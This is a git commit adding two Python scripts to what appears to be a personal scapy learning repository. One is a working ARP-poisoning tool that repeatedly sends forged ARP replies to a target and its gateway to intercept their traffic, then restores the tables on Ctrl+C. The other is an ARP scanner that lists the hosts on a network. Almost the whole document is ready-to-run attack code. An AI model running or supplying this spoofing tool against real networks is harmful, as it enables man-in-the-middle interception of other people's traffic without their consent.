cf68f1e83dfdd3f0518f90ab025fe987208fa795
Yingbo (Max) Wang <maxwyb@gmail.com>
2019-11-16 17:28:06 -0800

    Add scapy script for ARP poisoning.

---
+++ scapy-playground/arp-spoofing-scapy.py
@@ -0,0 +1,59 @@
+import scapy.all as scapy
+import time
+import argparse
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target",
+                        help="Target IP")
+    parser.add_argument("-g", "--gateway", dest="gateway",
+                        help="Gateway IP")
+    options = parser.parse_args()
+    return options
+
+
+# Get target mac address using ip address
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    while True:
+        answered_list = scapy.srp(arp_request_broadcast, timeout=5,  # NOTE: the timeout value has to be large in bad network
+                                  verbose=False)[0]
+        if len(answered_list) > 0:
+            break
+    return answered_list[0][1].hwsrc
+
+
+# Change mac address in arp table
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                       psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+# Restore mac address in arp table
+def restore(dest_ip, source_ip):
+    dest_mac = get_mac(dest_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
+                       psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+
+options = get_arguments()
+sent_packets_count = 0
+try:
+    while True:
+        spoof(options.target, options.gateway)
+        spoof(options.gateway, options.target)
+        sent_packets_count += 2
+        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
+    restore(options.target, options.gateway)
+    restore(options.gateway, options.target)
+    print("\nARP table restored. Quiting")
---
+++ scapy-playground/scan-hosts-scapy.py
@@ -0,0 +1,36 @@
+import scapy.all as scapy
+import argparse
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target",
+                        help="Target IP/IP Range")
+    options = parser.parse_args()
+    return options
+
+
+def scan(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=5,  # NOTE: the timeout value has to be large in bad network
+                              verbose=False)[0]
+
+    clients_list = []
+    for element in answered_list:
+        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+        clients_list.append(client_dict)
+    return clients_list
+
+
+def print_result(results_list):
+    print("IP\t\t\tMAC Address")
+    print("----------------------------------------------------")
+    for client in results_list:
+        print(client["ip"] + "\t\t" + client["mac"])
+
+
+options = get_arguments()
+scan_result = scan(options.target)
+print_result(scan_result)
